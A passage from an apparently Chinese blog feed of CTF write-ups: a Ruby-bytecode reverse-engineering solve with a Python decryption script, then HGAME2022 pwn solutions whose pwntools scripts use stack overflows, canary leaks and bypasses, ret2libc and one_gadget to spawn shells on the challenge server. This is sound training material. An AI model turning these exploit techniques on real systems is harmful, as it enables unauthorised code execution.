class="number">2</span> syms=<span class="number">7</span> reps=<span class="number">0</span> ilen=<span class="number">128</span><span class="comment">// ä¸»é€»è¾‘check()</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">  R3:i</span><br><span class="line">  R4:lst_ch</span><br><span class="line">  R5:c</span><br><span class="line">  R6:k</span><br><span class="line">  R7:cipher_text</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> LOADI_0R3; R3:i</span><br><span class="line">      <span class="number">006</span> LOADI_0R4; R4:lst_ch</span><br><span class="line">          <span class="comment">//iå’Œlst_chåˆè¯•å‡ä¸º0</span></span><br><span class="line">      <span class="number">008</span> MOVER8R3; R3:i</span><br><span class="line">      <span class="number">011</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">014</span> SENDR9:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">018</span> LTR8R9</span><br><span class="line">      <span class="number">020</span> JMPNOTR8<span class="number">086</span></span><br><span class="line">          <span class="comment">//ä»¥ä¸Šæ˜¯å¯¹iåšå¾ªç¯ï¼Œæ¡ä»¶ä¸º`for i in range(len(p))`</span></span><br><span class="line">      <span class="number">024</span> MOVER8R1; R1:p</span><br><span class="line">      <span class="number">027</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">030</span> GETIDXR8R9</span><br><span class="line">          <span class="comment">//å–p[i]</span></span><br><span class="line">      <span class="number">032</span> SENDR8:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">036</span> MOVER5R8; R5:c</span><br><span class="line">          <span class="comment">//ord(p[i])èµ‹å€¼ç»™c</span></span><br><span class="line">      <span class="number">039</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">042</span> MOVER9R4; R4:lst_ch</span><br><span class="line">      <span class="number">045</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//å–cå’Œlst_chè¿›è¡Œå¼‚æˆ–</span></span><br><span class="line">      <span class="number">049</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">052</span> ADDIR9<span class="number">1</span></span><br><span class="line">          <span class="comment">//å–i+1</span></span><br><span class="line">      <span class="number">055</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//å°†c^lst_chçš„ç»“æœå’Œ(i+1)å¼‚æˆ–</span></span><br><span class="line">      <span class="number">059</span> SENDR8:chrn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//å°†è¯¥ç»“æœchrå›æ¥</span></span><br><span class="line">      <span class="number">063</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">066</span> MOVER10R3; R3:i</span><br><span class="line">      <span class="number">069</span> MOVER11R8</span><br><span class="line">      <span class="number">072</span> SETIDXR9R10R11</span><br><span class="line">          <span class="comment">//å°†chråçš„å­—ç¬¦èµ‹å€¼ç»™p[i]</span></span><br><span class="line">      <span class="number">074</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">077</span> MOVER4R8; R4:lst_ch</span><br><span class="line">          <span class="comment">//æŠŠcçš„å€¼èµ‹ç»™lst_ch</span></span><br><span class="line">      <span class="number">080</span> ADDIR3<span class="number">1</span>; R3:i</span><br><span class="line">      <span class="number">083</span> JMP<span class="number">008</span></span><br><span class="line">          <span class="comment">//æ­¥é•¿å¾ªç¯ä¸º1</span></span><br><span class="line">      <span class="number">086</span> STRINGR6<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; aaaassssddddffff; R6:k</span><br><span class="line">          <span class="comment">//å¾ªç¯ç»“æŸåå®šä¹‰k=&#x27;aaaassssddddffff&#x27;</span></span><br><span class="line">      <span class="number">089</span> GETCONSTR8Crypt</span><br><span class="line">      <span class="number">092</span> GETMCNSTR8R8::CIPHER</span><br><span class="line">      <span class="number">095</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">098</span> MOVER10R6; R6:k</span><br><span class="line">      <span class="number">101</span> SENDR8:encryptn=<span class="number">2</span></span><br><span class="line">          <span class="comment">//è°ƒç”¨Crypt.CIPHER.encrypt(p, k)</span></span><br><span class="line">      <span class="number">105</span> MOVER7R8; R7:cipher_text</span><br><span class="line">      <span class="number">108</span> MOVER8R7; R7:cipher_text</span><br><span class="line">          <span class="comment">//å°†åŠ å¯†ç»“æœèµ‹å€¼ç»™cipher_text</span></span><br><span class="line">      <span class="number">111</span> STRINGR9<span class="title function_">L</span><span class="params">(<span class="number">1</span>)</span>; f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb</span><br><span class="line">      <span class="number">114</span> EQR8R9</span><br><span class="line">          <span class="comment">//å°†cipher_textä¸f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdbè¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">      <span class="number">116</span> JMPNOTR8<span class="number">124</span></span><br><span class="line">      <span class="number">120</span> LOADTR8</span><br><span class="line">      <span class="number">122</span> RETURNR8</span><br><span class="line">      <span class="number">124</span> LOADFR8</span><br><span class="line">      <span class="number">126</span> RETURNR8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_key</span>(<span class="params">p</span>):</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p), <span class="number">4</span>):</span><br><span class="line">        a.append(<span class="built_in">int</span>(p.encode()[i:i+<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line">c = <span class="string">&quot;f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb&quot;</span></span><br><span class="line">XX = <span class="number">305419896</span></span><br><span class="line">YY = <span class="number">16</span></span><br><span class="line">key = to_key(<span class="string">&quot;aaaassssddddffff&quot;</span>)</span><br><span class="line"> </span><br><span class="line">dec = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">16</span>):</span><br><span class="line">    num1 = <span class="built_in">int</span>(c[i:i+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">    num2 = <span class="built_in">int</span>(c[i+<span class="number">8</span>:i+<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">    y = num1  <span class="comment"># R5</span></span><br><span class="line">    z = num2  <span class="comment"># R6</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        s = s + XX</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        z = z - ((((y &lt;&lt; <span class="number">3</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (s + key[(s + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        z = z &amp; <span class="number">0xffffffff</span></span><br><span class="line">        s = s - XX</span><br><span class="line">        y = y - ((((z &lt;&lt; <span class="number">3</span>) ^ (z &gt;&gt; <span class="number">5</span>)) + z) ^ (s + key[((s &gt;&gt; <span class="number">11</span>) + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        y = y &amp; <span class="number">0xffffffff</span></span><br><span class="line">    dec[i//<span class="number">2</span>:i//<span class="number">2</span>+<span class="number">4</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(y)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line">    dec[i//<span class="number">2</span>+<span class="number">4</span>:i//<span class="number">2</span>+<span class="number">8</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(z)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line"><span class="built_in">print</span>(dec.<span class="built_in">hex</span>())</span><br><span class="line">lst_ch = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec)):</span><br><span class="line">    c = dec[i]</span><br><span class="line">    dec[i] = (c ^ (i + <span class="number">1</span>)) ^ lst_ch</span><br><span class="line">    lst_ch = dec[i]</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è€ƒç ”é€‰æ‰‹æ¥æ‘¸é±¼ã€‚&lt;/p&gt;
&lt;p&gt;ä»Šå¹´å›½èµ›èœå¾—å¾ˆå¿«ä¹ï¼Œè¶Ÿå¾—ä¹Ÿå¾ˆå¿«ä¹~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2022</title>
    <link href="http://example.com/2022/01/24/hgame2022/"/>
    <id>http://example.com/2022/01/24/hgame2022/</id>
    <published>2022-01-24T07:19:07.000Z</published>
    <updated>2023-02-01T14:30:53.472Z</updated>
    
    <content type="html"><![CDATA[<p>é—²ç€æ—¶å°±å»æ‰“äº†ä¸‹æ­ç”µçš„ HGAME2022ï¼Œä»¥ä¸ºç¬¬ä¸€å‘¨çš„é¢˜ç›®éƒ½ä¼šè›®ç®€å•çš„ï¼Œæ²¡æƒ³åˆ°æ¯é“é¢˜éƒ½èŠ±äº†ä¸å°‘åŠŸå¤«ï¼Œå‡ºé¢˜äººç”šè‡³è¿˜åªæ˜¯å¤§äºŒå­¦ç”Ÿï¼Œé¡¿æ—¶æ„Ÿè§‰åˆ°å‚å·®äº†ã€‚</p><span id="more"></span><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="test-your-gdb"><a href="#test-your-gdb" class="headerlink" title="test_your_gdb"></a>test_your_gdb</h3><p>å…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/142799/6/33729/24698/63c7a9bcF35bfad36/6fed4a2b8bff6c89.png" style="zoom:80%;" /><p>å†çœ‹ä¸€ä¸‹ç¨‹åºé€»è¾‘</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/101274/4/36756/155822/63c7a9feF099d1b28/cfdd54cc86c9145f.png" style="zoom:80%;" /><p>åŠ¨è°ƒç›´æ¥å»çœ‹åŠ å¯†åçš„ s2ï¼Œæˆ‘ä»¬å¤§æ¦‚åœåœ¨åˆ¤æ–­ä½ç½®å¤„ï¼Œçœ‹ä¸€ä¸‹ s2 å³ <strong>rsi</strong> çš„å€¼</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/160500/8/33195/17712/63c7aa34F130596f6/e241e939f93143d9.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/137137/5/32624/66896/63c7aa4dF03e59ce9/efe2f0a3602f0da7.png" style="zoom:80%;" /><p>ä¸Šå›¾æ˜¾ç¤ºä¸å…¨ï¼Œå› ä¸ºä¸€å…±è¦æ¯”è¾ƒ 16 ä¸ªå­—èŠ‚ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55339/21/22199/50202/63c7aa63F62dce033/9aee5be3ca36bf1b.png" style="zoom:80%;" /><p>æ‰€ä»¥ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">50610</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">backdoor=<span class="number">0x401256</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0xb0361e0e8294f147</span>)+p64(<span class="number">0x8c09e0c34ed8a6a9</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;enter your pass word\n&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">24</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary===&gt;&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="enter-the-pwn-land"><a href="#enter-the-pwn-land" class="headerlink" title="enter_the_pwn_land"></a>enter_the_pwn_land</h3><p>å…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75946/29/24063/23754/63c7aaa1Fdf2816d1/56fe50f63cfa50e0.png" style="zoom:80%;" /><p>çœ‹ä¸€ä¸‹ä¸»è¦å‡½æ•°ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98042/24/22695/37543/63c7aaa0F7e0149da/03e9383158ddc998.png" style="zoom: 80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>å¯ä»¥çœ‹åˆ°ä¸æ–­åˆ›é€ çº¿ç¨‹è¿›å…¥ä¸€ä¸ªå¸¦æœ‰æ ˆæº¢å‡ºæ¼æ´çš„å‡½æ•°ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œv3 ä½œä¸º read çš„è¿”å›å€¼å’Œ i ä½œä¸º s çš„å‚æ•°å†³å®šäº†è¯»å…¥çš„ä½ç½®ï¼Œè¿™ä¸¤è€…åœ¨è¦†ç›–çš„æ—¶å€™å‡ä¸åº”è¢«æ”¹å˜ï¼ˆä¸æ–­çš„æµ‹è¯•å‘ç° v3 ä¸èƒ½å˜ï¼Œi æŒ‰ç†è¯´å¯ä»¥å˜æˆä¸‹ä¸€æ¬¡æƒ³è¯»å…¥çš„ä½ç½®ï¼‰ã€‚</p><p>æ¸…æ¥šè¿™ä¸€ç‚¹åï¼Œexp å°±æ˜¯æ™®é€šçš„ ret2libcï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">34686</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./a&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401313</span></span><br><span class="line">call_puts=<span class="number">0x0401090</span></span><br><span class="line">vul=<span class="number">0x04011BA</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0x404028</span>)+p64(call_puts)</span><br><span class="line">payload += p64(vul)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc=======&gt;&quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;setbuf&quot;</span>]))</span><br><span class="line">log.success(<span class="string">&quot;setbuf===&gt;&quot;</span>+<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#libc_base=read_addr-libc.sym[&quot;read&quot;]</span></span><br><span class="line"><span class="comment">#log.success(&quot;read_addr====&gt;&quot;+hex(libc.sym[&quot;read&quot;]))</span></span><br><span class="line"><span class="comment">#log.success(&quot;libc_base====&gt;&quot;+hex(libc_base))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šæ‰“è¿œç¨‹çš„æ—¶å€™å‘ç°æ³„éœ² read çš„å‡½æ•°åœ°å€è®¡ç®—åŸºå€æ—¶ä¼šæœ‰åå·®ï¼Œæ‰€ä»¥æ¢äº† setbuf å°±æˆäº†ã€‚libc-2.31 ä¹Ÿéœ€è¦æ ˆå¯¹é½ã€‚</p><h3 id="enter-the-evil-pwn-land"><a href="#enter-the-evil-pwn-land" class="headerlink" title="enter_the_evil_pwn_land"></a>enter_the_evil_pwn_land</h3><p>é¢˜ç›®å’Œä¸Šé¢˜ç¨æœ‰å˜åŒ–ï¼Œä¿æŠ¤æ–¹é¢å¤šå¼€å¯äº†ä¸ª canary</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/163026/7/33522/24750/63c7aaa0Fcb1ef617/3becf79a7f742530.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>å½“æ—¶çš„ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯åˆ©ç”¨ puts æ³„éœ²canaryï¼Œä¸è¿‡å›è¿‡ç¥æ¥å‘ç° puts è¿‡åå°±ç›´æ¥æ£€æµ‹ canary äº†ï¼Œæ‰€ä»¥æ‰“æ¶ˆè¿™ä¸ªå¿µå¤´ã€‚</p><p>è®°å¿†ä¸­å…¶ä»–ç»•è¿‡ canary çš„æ–¹æ³•æœ‰<strong>åŠ«æŒ _stack_chk_fail</strong>ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯<strong>åŒæ—¶ä¿®æ”¹ canary å’Œ TLS ç»“æ„ä½“</strong>ä¸­é¢„å­˜çš„ canaryã€‚å‰è€…ä¸€èˆ¬éœ€è¦ä»»æ„å†™ï¼Œåè€…çš„è¯å°è±¡ä¸­æ²¡é‡åˆ°è¿‡ã€‚ä¸è¿‡ä¼¼ä¹æœ‰ä¸€ç§ stack smash æ³„éœ²ä¿¡æ¯çš„å·§å¦™æ–¹æ³•ï¼Œè¿™å°±è§¦å‘äº†æˆ‘çš„è„‘æ´ï¼Œä¼šä¸ä¼šï¼Œæœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼ŒTLS ç»“æ„ä½“å°±è¢«å¸ƒç½®åœ¨äº†<strong>æ ˆ</strong>ä¸Šï¼Ÿå†µä¸”è¿™é“é¢˜æº¢å‡ºçš„ç©ºé—´è¿˜ä¸å°‘ã€‚</p><p>äºæ˜¯æˆ‘å°± gdb è°ƒè¯•äº†ä¸€ä¸‹ï¼Œçœ‹äº†ä¸€ä¸‹æ ˆä¸Šçš„ä¿¡æ¯</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/167708/4/31793/115472/63c7ab82F05d5d258/d54bbde560c2ee86.png" style="zoom:67%;" /><p>ç„¶åå°±ç»§ç»­å¾€ä¸‹æ‰¾ï¼Œç»ˆäºåœ¨å¾ˆè¿œå¤„å‘ç°äº†å¯ç–‘ç›®æ ‡ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/57709/16/23077/110254/63c7ab96F17f3a3e3/d2ac97e9c74302f9.png" style="zoom:80%;" /><p>æ­¤æ—¶æˆ‘åŒæ—¶å°†ä¸¤å¤„è¦†ç›–ä¸º<code>aaaaaaaa</code>ï¼Œå‘ç°ç¨‹åºä¸å†æŠ¥ stack smash é”™è¯¯ï¼Œè¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸç»•è¿‡äº† canaryï¼Œéœ€è¦è¯´æ˜çš„æ˜¯è¿œç¨‹åç§»å’Œæœ¬åœ°ä¸ä¸€æ ·ï¼Œé€è¿‡å»çš„æ•°æ®å°½é‡å¤§å°±è¡Œã€‚</p><p>ç»§ç»­æ‰“ ret2libc æ„é€  system(â€˜/bin/shâ€™)æ‰“ä¸é€šã€‚</p><p>åŸå› ä¸è¯¦ï¼ŒçŒœæµ‹æ˜¯æ ˆç»“æ„è¢«æˆ‘ä»¬æå¾—ä¸ƒé›¶å…«è½çš„ï¼Œäºæ˜¯å°±è€ƒè™‘æ‰“ one_gadgetã€‚ï¼ˆä¸çŸ¥ä¸ºä½• ubuntu16.04 æ£€æµ‹ libc-2.31.so æ—¶ä¼šæŠ¥é”™ï¼Œ18 çš„å°±ä¸ä¼šï¼‰å¦‚ä¸‹ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/132953/12/29754/44405/63c8b9f0F978fb6b5/e01668aae890faba.png" style="zoom:80%;" /><p>ç›´æ¥æ‰“æ‰“ä¸é€šï¼Œé€‰æ‹©å°è¯•æ„é€ æ¡ä»¶ï¼Œå› ä¸ºç¨‹åºé‡Œæœ‰ csu çš„ gadgetï¼Œæ‰€ä»¥å°†å¯„å­˜å™¨ r15 å’Œ r12 ç½®é›¶è½»è€Œæ˜“ä¸¾ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/69351/29/25073/45548/63c8b9eeFc7a7133f/c5c0d76ceec68220.png" style="zoom:80%;" /><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">35225</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401363</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404030</span>)+p64(<span class="number">0x4010A0</span>)+p64(<span class="number">0x4011DA</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">3000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6c7e</span></span><br><span class="line">log.success(<span class="string">&#x27;system==&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">log.success(<span class="string">&#x27;binsh===&gt;&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x000000000040135c</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(one_gadget)</span><br><span class="line"><span class="comment">#payload=payload.ljust(3000,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="oldfashion-orw"><a href="#oldfashion-orw" class="headerlink" title="oldfashion_orw"></a>oldfashion_orw</h3><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤ï¼ŒNX å¼€ç€ï¼Œçœ‹æ¥ä¸æ˜¯ç¼–å†™ shellcode é¢˜å‹</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143518/13/33139/24804/63c7ac29F05bbc606/cbde94e9b4214053.png" style="zoom:80%;" /><p>çœ‹ä¸€ä¸‹ä¸»å‡½æ•°é€»è¾‘</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/161218/20/34466/65115/63c7ac22F5927c23f/96c8d82807f603c2.png" style="zoom:80%;" /><p>æœ‰ä¸ªæ²¡æ£€æŸ¥ä¸‹é™å¯¼è‡´çš„æ ˆæº¢å‡ºã€‚é€šè¿‡è¿™æ®µæº¢å‡ºï¼Œæ„é€  orw é“¾å³å¯ã€‚</p><p>ä½†è¿™é¢˜çš„ flag å¹¶ä¸å« flagï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å‡ºé¢˜äººç»™çš„éƒ¨ç½²æ–‡ä»¶ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/95051/26/18295/43571/63c7ac21F5f93642c/fb3c8ecc59e11856.png" style="zoom:80%;" /><img 